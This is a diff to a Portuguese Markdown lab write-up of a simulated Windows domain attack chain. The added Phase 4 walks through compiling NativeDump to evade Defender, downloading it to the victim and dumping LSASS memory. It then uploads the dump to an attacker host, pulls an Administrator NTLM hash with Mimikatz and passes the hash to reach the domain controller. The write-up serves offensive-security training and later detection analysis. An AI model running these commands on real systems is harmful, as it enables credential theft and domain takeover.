@@ -1,4 +1,4 @@
-### **Em construção......**
+### **Em construção...... Analise pos ataque em construção**
 
 
 # Simulação de Cadeia de Ataque - Laboratório de Segurança Ofensiva
@@ -17,7 +17,7 @@ A cadeia de ataque envolve as seguintes etapas:
 1. [Acesso inicial:](#-fase-1---acesso-inicial-via-macro-em-documento-word-phishing) comprometimento de uma estação de trabalho através da execução de uma macro maliciosa em um documento do Word.
 2. [Escalada de privilégios local:](#-fase-2--escalada-de-privil%C3%A9gios-local) obtenção de privilégios SYSTEM explorando uma tarefa agendada mal configurada.
 3. [Enumeração do dominio:](#-fase-3--enumera%C3%A7%C3%A3o-p%C3%B3s-escala%C3%A7%C3%A3o) Enumerar o ambiente local e de domínio e avaliar a viabilidade de extrair as credenciais da memória (lsass.exe).
-4. **Exfiltração de credenciais e Movimentação lateral**: extração da memória do processo LSASS para capturar credenciais em texto claro e hashes NTLM e acesso ao controlador de domínio (Domain Controller) utilizando técnicas de Pass-the-Hash.
+4. [Exfiltração de credenciais e Acesso ao DC:](#https://github.com/MercioRodrigues/Windows-server-AD/edit/main/Cadeia%20de%20um%20ataque.md#fase-4--extra%C3%A7%C3%A3o-de-credenciais-via-dump-de-lsass-com-nativedump) extração da memória do processo LSASS para capturar credenciais em texto claro e hashes NTLM e acesso ao controlador de domínio (Domain Controller) utilizando técnicas de Pass-the-Hash.
  
 
 **Análise pós-ataque**: utilização de ferramentas de monitorização e deteção como **Wazuh** e **Wireshark** para investigar a intrusão e compreender os rastros deixados nos logs do sistema e na rede.
@@ -528,13 +528,198 @@ Com estes dados confirmados:
 
 ---
 
-### ✅ Conclusão da Fase 3
+### Conclusão da Fase 3
 
 Com privilégios de `NT AUTHORITY\SYSTEM` e verificação de que estamos como **Domain Admin**, foi possível confirmar que o sistema comprometido é uma excelente base para:
 
 - Extração de credenciais da memória (`lsass.exe`).
 - Acesso irrestrito ao domínio.  
 
+---
+
+<br/>
+    <br/>
+
+## 🧪Fase 4 — Extração de Credenciais via Dump de LSASS com NativeDump
+
+Após a obtenção de privilégios SYSTEM, o objetivo passou a ser capturar credenciais da memória do processo `lsass.exe`, de forma furtiva e sem acionar antivírus. Isso permitiu acesso a contas privilegiadas de domínio para movimentações laterais.
+
+---
+
+### 1. Compilar o NativeDump no Kali Linux
+
+A ferramenta utilizada foi o **NativeDump** (versão em Golang), que depois de sofrer cross-compilation não foi detetável por soluções como o Windows Defender.
+
+```bash
+wget https://raw.githubusercontent.com/ricardojoserf/NativeDump/main/golang-flavour/nativedump.go
+```
+
+Inicialização do projeto Go:
+
+```bash
+go mod init nativedump
+go mod tidy
+```
+
+Compilação para Windows (cross-compilation):
+
+```bash
+env GOOS=windows GOARCH=amd64 go build nativedump.go
+```
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/a252cd72-e443-4422-a4e3-d41527263962" height="80%" width="80%"/>
+    <br/>
+    <br/>
+  <p/>
+
+
+
+✅ Gera o ficheiro `nativedump.exe`, pronto para transferência.
+
+---
+
+### 2. Transferência do Executável para a Vítima
+
+```powershell
+Invoke-WebRequest -Uri "http://192.168.1.205:8080/nativedump.exe" -OutFile "C:\Windows\Temp\nativedump.exe"
+cd C:\Windows\Temp
+```
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/bccb6186-b9d4-468a-b900-b3eb673126bf" height="60%" width="60%"/>
+    <br/>
+    <br/>
+  <p/>
+
+Transferência feita sem levantar alertas.
+
+---
+
+### 3. Dump de LSASS
+
+```powershell
+.\nativedump.exe -o .\proc_664.dmp
+```
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/3125424b-68fa-4579-a267-79478a053e1e" height="60%" width="60%"/>
+    <br/>
+    <br/>
+  <p/>
+
+✅ O NativeDump identificou automaticamente o PID do processo `lsass.exe` e gerou um dump da sua memória. Isso incluiu credenciais e hashes em uso no momento.
+
+---
+
+### 4. Exfiltrar o Dump para o Atacante
+
+```powershell
+Invoke-RestMethod -Uri "http://192.168.1.205:8080/proc_696.dmp" -Method PUT -InFile "C:\\Windows\\Temp\\proc_696.dmp"
+```
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/69713f1e-ff9c-4051-9ad8-6ca858fcae0f" height="60%" width="60%"/>
+    <br/>
+    <br/>
+  <p/>
+
+✅ O dump foi transferido com sucesso para análise offline no Kali.
+
+---
+
+### 5. Análise com Mimikatz
+
+A análise do ficheiro `.dmp` foi feita offline no Kali com **Mimikatz**, via `wine`:
+
+```bash
+wine mimikatz.exe
+```
+
+Comandos utilizados:
+
+```mimikatz
+sekurlsa::minidump /home/kali/Downloads/uploadserver/proc_696.dmp
+sekurlsa::logonPasswords
+```
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/30aa347b-b5bb-4763-a773-a5f013692b45" height="60%" width="60%"/>
+    <br/>
+    <br/>
+  <p/>
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/760f2bf8-63d6-42ba-9143-596a1c739a0d" height="60%" width="60%"/>
+    <br/>
+    <br/>
+  <p/>
+
+
+**Output relevante:**
+
+```
+Username : Administrator 500
+NTLM     : a1f074c272b7d460ccdd7f8f19c5419b
+Já sabemos que pertence ao domínio PILAO e o DC tem IP:192.168.1.200 
+```
+
+✅ Obtido o hash NTLM do utilizador `Administrator` (confirmado como membro do grupo `Domain Admins`).
+
+---
+
+### 6. Acesso Remoto com Pass-The-Hash
+
+Com as informações necessárias e o hash NTLM em posse, foi possível autenticar no **Controlador de Domínio** remotamente:
+
+```bash
+python3 ~/impacket/examples/wmiexec.py PILAO/Administrator@192.168.1.200 -hashes :a1f074c272b7d460ccdd7f8f19c5419b
+```
+
+
+<p align="center">
+<br/>
+  <br/>
+  <img src="https://github.com/user-attachments/assets/b990afa8-37c4-4eca-9e0f-9f8b189664e5" height="60%" width="60%"/>
+    <br/>
+    <br/>
+  <p/>
+
+Shell remota estabelecida:
+
+```cmd
+C:\> whoami
+pilao\administrator
+```
+
+---
+
+### ✅ Resultado
+
+O atacante agora detém controlo completo sobre o domínio:
+
+- Acesso ao **DC (Domain Controller)**
+- Permissões de **Administrador de Domínio**
+- Capacidade de:
+  - Extrair hashes de toda a base de utilizadores
+  - Modificar políticas de grupo (GPOs)
+  - Criar utilizadores e persistência
+  - Efetuar **movimentações laterais**
+  - Lançar ataques como Golden Ticket ou DCSync
+
+---
 
 
 
